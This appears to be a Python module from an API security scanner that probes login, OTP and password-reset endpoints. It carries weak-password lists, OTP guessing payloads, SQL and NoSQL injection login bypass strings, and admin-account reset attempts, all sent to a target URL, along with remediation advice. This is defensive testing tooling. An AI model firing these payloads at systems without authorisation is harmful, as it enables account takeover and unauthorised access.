"""
Broken Authentication Detection Module.

Tests API endpoints for authentication vulnerabilities by:
- Testing password reset flows
- Detecting weak authentication mechanisms
- Testing for authentication bypass
- Analyzing token handling
"""

import time
import json
import re
import base64
import hashlib
from typing import Any, Optional
from dataclasses import dataclass
import requests

from ..models import (
    AttackType,
    AttackResult,
    Endpoint,
    Severity,
    Vulnerability
)


@dataclass
class AuthContext:
    """Context for authentication testing."""
    user_email: Optional[str] = None
    user_phone: Optional[str] = None
    user_id: Optional[str] = None
    valid_token: Optional[str] = None


class BrokenAuthAttacker:
    """Detects broken authentication vulnerabilities in API endpoints.
    
    Covers OWASP API5:2023 - Broken Function Level Authorization and
    API7:2023 - Server Side Request Forgery related auth issues.
    """
    
    # Common password reset endpoints
    RESET_ENDPOINTS = [
        '/identity/api/auth/forget-password',
        '/api/auth/forgot-password',
        '/api/auth/reset-password',
        '/api/password/reset',
        '/api/v1/auth/forgot',
        '/auth/recover',
        '/auth/password/forgot',
    ]
    
    # OTP verification endpoints
    OTP_ENDPOINTS = [
        '/identity/api/auth/v3/check-otp',
        '/identity/api/auth/v2/check-otp',
        '/api/auth/verify-otp',
        '/api/otp/verify',
        '/auth/verify',
    ]
    
    # Login endpoints
    LOGIN_ENDPOINTS = [
        '/identity/api/auth/login',
        '/api/auth/login',
        '/auth/login',
        '/api/v1/login',
        '/user/login',
    ]
    
    # Common weak passwords
    WEAK_PASSWORDS = [
        'password', 'Password1!', '123456', 'qwerty',
        'admin', 'letmein', 'welcome', 'monkey',
        'password123', 'admin123', 'root', 'toor'
    ]
    
    # OTP brute force payloads
    OTP_PAYLOADS = [
        {'otp': '000000'},
        {'otp': '123456'},
        {'otp': '111111'},
        {'otp': '00000'},
        {'otp': '12345'},
        {'otp': '654321'},
        {'otp': '999999'},
        {'code': '000000'},
        {'code': '123456'},
    ]
    
    # Token manipulation patterns
    TOKEN_MANIPULATIONS = [
        # Remove token
        {'remove': True},
        # Empty token
        {'token': ''},
        # Null token
        {'token': None},
        # Invalid token
        {'token': 'invalid_token'},
        # JWT without signature
        {'jwt_none': True},
        # Expired token
        {'expired': True},
    ]
    
    def __init__(self, target_url: str, timeout: int = 10):
        """Initialize the Broken Authentication detector.
        
        Args:
            target_url: Base URL of the target API
            timeout: Request timeout in seconds
        """
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Sentinel/1.0 Auth Scanner',
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        })
        self.auth_context = AuthContext()
    
    def set_context(self, context: AuthContext):
        """Set authentication context for testing.
        
        Args:
            context: Authentication context with user info
        """
        self.auth_context = context
    
    def attack(
        self,
        endpoint: Endpoint,
        auth_token: Optional[str] = None,
        parameters_to_test: Optional[list[str]] = None
    ) -> list[AttackResult]:
        """Perform broken authentication attacks on an endpoint.
        
        Args:
            endpoint: The endpoint to attack
            auth_token: Authentication token
            parameters_to_test: Specific parameters to test
            
        Returns:
            List of attack results
        """
        # Handle API misuse
        if auth_token is not None and isinstance(auth_token, list):
            parameters_to_test = auth_token
            auth_token = None
        
        results: list[AttackResult] = []
        
        if auth_token:
            self.session.headers['Authorization'] = f"Bearer {auth_token}"
        
        path_lower = endpoint.path.lower()
        
        # 1. Test password reset flow
        if 'forget' in path_lower or 'reset' in path_lower or 'forgot' in path_lower:
            results.extend(self._test_password_reset(endpoint))
        
        # 2. Test OTP verification
        if 'otp' in path_lower or 'verify' in path_lower:
            results.extend(self._test_otp_bypass(endpoint))
        
        # 3. Test login endpoint
        if 'login' in path_lower or 'signin' in path_lower:
            results.extend(self._test_login_weaknesses(endpoint))
        
        # 4. Test token handling
        if 'token' in path_lower or 'session' in path_lower:
            results.extend(self._test_token_handling(endpoint, auth_token))
        
        # 5. Test authentication bypass on protected endpoints
        if endpoint.requires_auth:
            results.extend(self._test_auth_bypass(endpoint, auth_token))
        
        # 6. Discover and test auth endpoints
        results.extend(self._discover_auth_endpoints(endpoint))
        
        return results

    def _is_sensitive_data(self, response_text: str) -> bool:
        """Check whether a response exposes authenticated-only data."""
        response_lower = response_text.lower()
        return any(
            field in response_lower
            for field in ["email", "username", "account", "user", "token"]
        )

    def _extract_evidence_excerpt(self, response_text: str) -> Optional[str]:
        """Extract a focused evidence snippet around sensitive fields."""
        response_lower = response_text.lower()
        for field in ["email", "username", "account", "user", "token"]:
            index = response_lower.find(field)
            if index != -1:
                start = max(index - 40, 0)
                end = min(index + 160, len(response_text))
                return response_text[start:end]
        return response_text[:200] if response_text else None

    def _responses_equivalent(self, a: str, b: str) -> bool:
        """Compare two response bodies semantically when possible."""
        try:
            a_json = json.loads(a)
            b_json = json.loads(b)
            return a_json == b_json
        except Exception:
            return a.strip() == b.strip()

    def _build_attack_result(
        self,
        endpoint: Endpoint,
        payload: str,
        url: str,
        response: Optional[requests.Response] = None,
        error_message: Optional[str] = None,
        duration_ms: Optional[float] = None,
        success: bool = False,
    ) -> AttackResult:
        """Create a broken-auth result with minimal proof fields."""
        response_text = response.text[:500] if response is not None else None
        evidence_excerpt = None
        if response is not None and success:
            evidence_excerpt = self._extract_evidence_excerpt(response.text)

        return AttackResult(
            endpoint=endpoint,
            attack_type=AttackType.BROKEN_AUTH,
            success=success,
            payload=payload,
            request_url=url,
            request_method=endpoint.method.value,
            response_status=response.status_code if response is not None else None,
            response_body=response_text,
            evidence_excerpt=evidence_excerpt,
            duration_ms=duration_ms,
            error_message=error_message,
        )
    
    def _test_password_reset(self, endpoint: Endpoint) -> list[AttackResult]:
        """Test password reset vulnerabilities."""
        results = []
        
        # Test 1: Missing email validation
        result = self._test_reset_without_email(endpoint)
        if result:
            results.append(result)
        
        # Test 2: Email enumeration
        result = self._test_email_enumeration(endpoint)
        if result:
            results.append(result)
        
        # Test 3: Reset token leakage
        result = self._test_token_leakage(endpoint)
        if result:
            results.append(result)
        
        # Test 4: Reset for another user
        result = self._test_reset_other_user(endpoint)
        if result:
            results.append(result)
        
        return results
    
    def _test_reset_without_email(self, endpoint: Endpoint) -> Optional[AttackResult]:
        """Test password reset without providing email."""
        try:
            url = f"{self.target_url}{endpoint.path}"
            start_time = time.time()
            
            # Test with empty body
            response = self.session.request(
                endpoint.method.value,
                url,
                json={},
                timeout=self.timeout
            )
            
            duration_ms = (time.time() - start_time) * 1000
            
            # Check if reset succeeded without email
            is_vulnerable = response.status_code in [200, 201, 202]
            
            if is_vulnerable:
                return AttackResult(
                    endpoint=endpoint,
                    attack_type=AttackType.AUTH_BYPASS,
                    success=True,
                    payload="Empty body",
                    response_status=response.status_code,
                    response_body=response.text[:500],
                    duration_ms=duration_ms,
                    error_message="Password reset accepted without email"
                )
            
        except Exception as e:
            pass
        
        return None
    
    def _test_email_enumeration(
        self, 
        endpoint: Endpoint
    ) -> Optional[AttackResult]:
        """Test for email enumeration via timing or response differences."""
        try:
            url = f"{self.target_url}{endpoint.path}"
            
            # Test with valid email
            valid_email = self.auth_context.user_email or 'valid@test.com'
            invalid_email = 'nonexistent_user_xyz@test.com'
            
            # Request with invalid email
            start_time = time.time()
            response_invalid = self.session.request(
                endpoint.method.value,
                url,
                json={'email': invalid_email},
                timeout=self.timeout
            )
            invalid_duration = (time.time() - start_time) * 1000
            
            # Request with valid email
            start_time = time.time()
            response_valid = self.session.request(
                endpoint.method.value,
                url,
                json={'email': valid_email},
                timeout=self.timeout
            )
            valid_duration = (time.time() - start_time) * 1000
            
            # Check for timing difference (more than 200ms difference)
            timing_diff = abs(valid_duration - invalid_duration)
            
            if timing_diff > 200:
                return AttackResult(
                    endpoint=endpoint,
                    attack_type=AttackType.AUTH_BYPASS,
                    success=True,
                    payload=f"Timing diff: {timing_diff:.0f}ms",
                    response_status=response_valid.status_code,
                    response_body=f"Valid: {valid_duration:.0f}ms, Invalid: {invalid_duration:.0f}ms",
                    duration_ms=valid_duration,
                    error_message="Email enumeration via timing attack"
                )
            
            # Check for response difference
            if response_valid.text != response_invalid.text:
                if len(response_valid.text) > len(response_invalid.text) + 50:
                    return AttackResult(
                        endpoint=endpoint,
                        attack_type=AttackType.AUTH_BYPASS,
                        success=True,
                        payload="Response difference",
                        response_status=response_valid.status_code,
                        response_body=f"Valid len: {len(response_valid.text)}, Invalid: {len(response_invalid.text)}",
                        duration_ms=valid_duration,
                        error_message="Email enumeration via response difference"
                    )
            
        except Exception:
            pass
        
        return None
    
    def _test_token_leakage(self, endpoint: Endpoint) -> Optional[AttackResult]:
        """Test for reset token leakage in responses."""
        try:
            url = f"{self.target_url}{endpoint.path}"
            email = self.auth_context.user_email or 'test@test.com'
            
            start_time = time.time()
            response = self.session.request(
                endpoint.method.value,
                url,
                json={'email': email},
                timeout=self.timeout
            )
            duration_ms = (time.time() - start_time) * 1000
            
            # Check if token is exposed in response
            response_str = response.text.lower()
            token_patterns = ['token', 'reset_token', 'code', 'otp', 'key']
            
            for pattern in token_patterns:
                if pattern in response_str:
                    try:
                        data = response.json()
                        if isinstance(data, dict):
                            for key in token_patterns:
                                if key in data:
                                    return AttackResult(
                                        endpoint=endpoint,
                                        attack_type=AttackType.AUTH_BYPASS,
                                        success=True,
                                        payload=f"Email: {email}",
                                        response_status=response.status_code,
                                        response_body=response.text[:500],
                                        duration_ms=duration_ms,
                                        error_message=f"Reset token leaked in response: {key}"
                                    )
                    except:
                        pass
            
        except Exception:
            pass
        
        return None
    
    def _test_reset_other_user(self, endpoint: Endpoint) -> Optional[AttackResult]:
        """Test resetting password for another user."""
        try:
            url = f"{self.target_url}{endpoint.path}"
            
            # Try to reset with another user's email and our token
            other_emails = ['admin@test.com', 'administrator@test.com', 'root@test.com']
            
            for email in other_emails:
                start_time = time.time()
                response = self.session.request(
                    endpoint.method.value,
                    url,
                    json={'email': email},
                    timeout=self.timeout
                )
                duration_ms = (time.time() - start_time) * 1000
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if 'success' in str(data).lower() or 'sent' in str(data).lower():
                            return AttackResult(
                                endpoint=endpoint,
                                attack_type=AttackType.AUTH_BYPASS,
                                success=True,
                                payload=f"Reset requested for: {email}",
                                response_status=response.status_code,
                                response_body=response.text[:500],
                                duration_ms=duration_ms,
                                error_message=f"Password reset initiated for: {email}"
                            )
                    except:
                        pass
            
        except Exception:
            pass
        
        return None
    
    def _test_otp_bypass(self, endpoint: Endpoint) -> list[AttackResult]:
        """Test OTP verification bypass."""
        results = []
        
        for payload in self.OTP_PAYLOADS:
            try:
                url = f"{self.target_url}{endpoint.path}"
                
                # Add required parameters
                body = dict(payload)
                if self.auth_context.user_email:
                    body['email'] = self.auth_context.user_email
                
                start_time = time.time()
                response = self.session.request(
                    endpoint.method.value,
                    url,
                    json=body,
                    timeout=self.timeout
                )
                duration_ms = (time.time() - start_time) * 1000
                
                # Check for successful bypass
                if response.status_code == 200:
                    try:
                        data = response.json()
                        # Check for authentication success
                        if 'token' in data or 'success' in str(data).lower():
                            results.append(AttackResult(
                                endpoint=endpoint,
                                attack_type=AttackType.AUTH_BYPASS,
                                success=True,
                                payload=json.dumps(payload),
                                response_status=response.status_code,
                                response_body=response.text[:500],
                                duration_ms=duration_ms,
                                error_message=f"OTP bypassed with: {payload}"
                            ))
                    except:
                        pass
                
            except Exception:
                pass
        
        return results
    
    def _test_login_weaknesses(self, endpoint: Endpoint) -> list[AttackResult]:
        """Test login endpoint for weaknesses."""
        results = []
        
        # Test weak passwords
        for password in self.WEAK_PASSWORDS[:5]:
            result = self._test_weak_password(endpoint, password)
            if result:
                results.append(result)
        
        # Test SQL injection in login
        result = self._test_login_injection(endpoint)
        if result:
            results.append(result)
        
        # Test NoSQL injection in login
        result = self._test_login_nosql(endpoint)
        if result:
            results.append(result)
        
        return results
    
    def _test_weak_password(
        self, 
        endpoint: Endpoint, 
        password: str
    ) -> Optional[AttackResult]:
        """Test for weak password acceptance."""
        try:
            url = f"{self.target_url}{endpoint.path}"
            
            # Test with common usernames
            usernames = ['admin', 'administrator', 'root', 'test', 'user']
            
            for username in usernames:
                start_time = time.time()
                response = self.session.request(
                    endpoint.method.value,
                    url,
                    json={'username': username, 'password': password},
                    timeout=self.timeout
                )
                duration_ms = (time.time() - start_time) * 1000
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if 'token' in data or 'authenticated' in str(data).lower():
                            return AttackResult(
                                endpoint=endpoint,
                                attack_type=AttackType.AUTH_BYPASS,
                                success=True,
                                payload=f"{username}:{password}",
                                response_status=response.status_code,
                                response_body=response.text[:500],
                                duration_ms=duration_ms,
                                error_message=f"Weak password accepted: {username}"
                            )
                    except:
                        pass
            
        except Exception:
            pass
        
        return None
    
    def _test_login_injection(self, endpoint: Endpoint) -> Optional[AttackResult]:
        """Test SQL injection in login."""
        sql_payloads = [
            "' OR '1'='1",
            "admin'--",
            "' OR 1=1--",
            "admin'/*",
        ]
        
        for payload in sql_payloads:
            try:
                url = f"{self.target_url}{endpoint.path}"
                
                start_time = time.time()
                response = self.session.request(
                    endpoint.method.value,
                    url,
                    json={'username': payload, 'password': 'test'},
                    timeout=self.timeout
                )
                duration_ms = (time.time() - start_time) * 1000
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if 'token' in data:
                            return AttackResult(
                                endpoint=endpoint,
                                attack_type=AttackType.BROKEN_AUTH,
                                success=True,
                                payload=f"SQLi: {payload}",
                                response_status=response.status_code,
                                response_body=response.text[:500],
                                duration_ms=duration_ms,
                                error_message=f"SQL injection in login: {payload}"
                            )
                    except:
                        pass
                        
            except Exception:
                pass
        
        return None
    
    def _test_login_nosql(self, endpoint: Endpoint) -> Optional[AttackResult]:
        """Test NoSQL injection in login."""
        nosql_payloads = [
            {'username': {'$ne': ''}, 'password': {'$ne': ''}},
            {'username': 'admin', 'password': {'$gt': ''}},
            {'username': {'$regex': '.*'}, 'password': {'$regex': '.*'}},
        ]
        
        for payload in nosql_payloads:
            try:
                url = f"{self.target_url}{endpoint.path}"
                
                start_time = time.time()
                response = self.session.request(
                    endpoint.method.value,
                    url,
                    json=payload,
                    timeout=self.timeout
                )
                duration_ms = (time.time() - start_time) * 1000
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if 'token' in data:
                            return AttackResult(
                                endpoint=endpoint,
                                attack_type=AttackType.BROKEN_AUTH,
                                success=True,
                                payload=f"NoSQLi: {json.dumps(payload)}",
                                response_status=response.status_code,
                                response_body=response.text[:500],
                                duration_ms=duration_ms,
                                error_message=f"NoSQL injection in login"
                            )
                    except:
                        pass
                        
            except Exception:
                pass
        
        return None
    
    def _test_token_handling(
        self, 
        endpoint: Endpoint,
        auth_token: Optional[str]
    ) -> list[AttackResult]:
        """Test token handling vulnerabilities."""
        results = []
        
        if not auth_token:
            return results
        
        # Test without token
        try:
            url = f"{self.target_url}{endpoint.path}"
            headers = dict(self.session.headers)
            headers.pop('Authorization', None)
            
            start_time = time.time()
            response = self.session.request(
                endpoint.method.value,
                url,
                headers=headers,
                timeout=self.timeout
            )
            duration_ms = (time.time() - start_time) * 1000
            
            if response.status_code == 200:
                results.append(AttackResult(
                    endpoint=endpoint,
                    attack_type=AttackType.AUTH_BYPASS,
                    success=True,
                    payload="No token",
                    response_status=response.status_code,
                    response_body=response.text[:500],
                    duration_ms=duration_ms,
                    error_message="Endpoint accessible without token"
                ))
        except Exception:
            pass
        
        return results
    
    def _test_auth_bypass(
        self, 
        endpoint: Endpoint,
        auth_token: Optional[str]
    ) -> list[AttackResult]:
        """Test authentication bypass on protected endpoints."""
        results = []
        url = f"{self.target_url}{endpoint.path}"
        auth_variants: list[tuple[str, dict[str, str]]] = []

        base_headers = {
            key: value for key, value in self.session.headers.items()
            if key != 'Authorization'
        }

        baseline_response: Optional[requests.Response] = None
        if auth_token:
            try:
                baseline_response = self.session.request(
                    endpoint.method.value,
                    url,
                    headers={**base_headers, "Authorization": f"Bearer {auth_token}"},
                    timeout=self.timeout
                )
            except Exception:
                baseline_response = None

        auth_variants.append(("no_auth", base_headers))
        auth_variants.append((
            "invalid_token",
            {**base_headers, "Authorization": "Bearer invalid-token"},
        ))

        if auth_token:
            auth_variants.append((
                "reused_token",
                {**base_headers, "Authorization": f"Bearer {auth_token}"},
            ))

        for payload, headers in auth_variants:
            try:
                start_time = time.time()
                response = self.session.request(
                    endpoint.method.value,
                    url,
                    headers=headers,
                    timeout=self.timeout
                )
                duration_ms = (time.time() - start_time) * 1000
                success = (
                    response.status_code in [200, 201]
                    and self._is_sensitive_data(response.text)
                    and baseline_response is not None
                    and baseline_response.status_code in [200, 201]
                    and self._responses_equivalent(baseline_response.text, response.text)
                )
                results.append(
                    self._build_attack_result(
                        endpoint=endpoint,
                        payload=payload,
                        url=url,
                        response=response,
                        duration_ms=duration_ms,
                        success=success,
                        error_message=(
                            "Protected endpoint matched authenticated baseline without valid authentication"
                            if success else (
                                "Missing valid baseline for comparison"
                                if baseline_response is None else None
                            )
                        ),
                    )
                )
            except Exception as exc:
                results.append(
                    self._build_attack_result(
                        endpoint=endpoint,
                        payload=payload,
                        url=url,
                        error_message=str(exc),
                        success=False,
                    )
                )

        return results
    
    def _discover_auth_endpoints(self, endpoint: Endpoint) -> list[AttackResult]:
        """Discover and test authentication-related endpoints."""
        results = []
        
        # Test common auth endpoints
        all_auth_endpoints = (
            self.RESET_ENDPOINTS + 
            self.OTP_ENDPOINTS + 
            self.LOGIN_ENDPOINTS
        )
        
        for path in all_auth_endpoints:
            try:
                url = f"{self.target_url}{path}"
                
                # Test GET
                start_time = time.time()
                response = self.session.get(url, timeout=self.timeout)
                duration_ms = (time.time() - start_time) * 1000
                
                if response.status_code not in [404, 405]:
                    results.append(AttackResult(
                        endpoint=Endpoint(
                            path=path,
                            method='GET',
                            parameters=[]
                        ),
                        attack_type=AttackType.AUTH_BYPASS,
                        success=response.status_code == 200,
                        payload="Discovery",
                        response_status=response.status_code,
                        response_body=response.text[:200],
                        duration_ms=duration_ms,
                        error_message=f"Discovered endpoint: {path}"
                    ))
                
                # Test POST
                start_time = time.time()
                response = self.session.post(url, json={}, timeout=self.timeout)
                duration_ms = (time.time() - start_time) * 1000
                
                if response.status_code not in [404, 405]:
                    results.append(AttackResult(
                        endpoint=Endpoint(
                            path=path,
                            method='POST',
                            parameters=[]
                        ),
                        attack_type=AttackType.AUTH_BYPASS,
                        success=response.status_code in [200, 201],
                        payload="Discovery POST",
                        response_status=response.status_code,
                        response_body=response.text[:200],
                        duration_ms=duration_ms,
                        error_message=f"Discovered POST endpoint: {path}"
                    ))
                    
            except Exception:
                pass
        
        return results
    
    def create_vulnerability(
        self,
        result: AttackResult,
        endpoint: Endpoint
    ) -> Vulnerability:
        """Create a Vulnerability object from an attack result."""
        return Vulnerability(
            endpoint=endpoint,
            attack_type=AttackType.BROKEN_AUTH,
            severity=Severity.HIGH,
            title=f"Broken Authentication in {endpoint.full_path}",
            description=(
                f"Broken authentication vulnerability detected. {result.error_message or ''} "
                f"The API endpoint has weaknesses in its authentication mechanism "
                f"that could allow attackers to bypass authentication, impersonate users, "
                f"or gain unauthorized access to accounts."
            ),
            payload=result.payload or "",
            proof_of_concept=(
                f"Request: {result.request_method} {result.request_url}\n"
                f"Payload: {result.payload}\n"
                f"Response Status: {result.response_status}\n"
                f"Evidence: {result.evidence_excerpt}\n"
                f"Authentication bypass successful."
            ),
            recommendation=(
                "1. Implement multi-factor authentication (MFA)\n"
                "2. Use strong password policies\n"
                "3. Implement account lockout after failed attempts\n"
                "4. Use secure password reset mechanisms\n"
                "5. Never expose reset tokens in responses\n"
                "6. Implement rate limiting on auth endpoints\n"
                "7. Use secure session management\n"
                "8. Log all authentication attempts\n"
                "9. Use short-lived tokens with refresh mechanism\n"
                "10. Implement proper input validation"
            ),
            cwe_id="CWE-287",
            owasp_category="API2:2023 - Broken Authentication",
            response_evidence=result.evidence_excerpt or result.response_body
        )
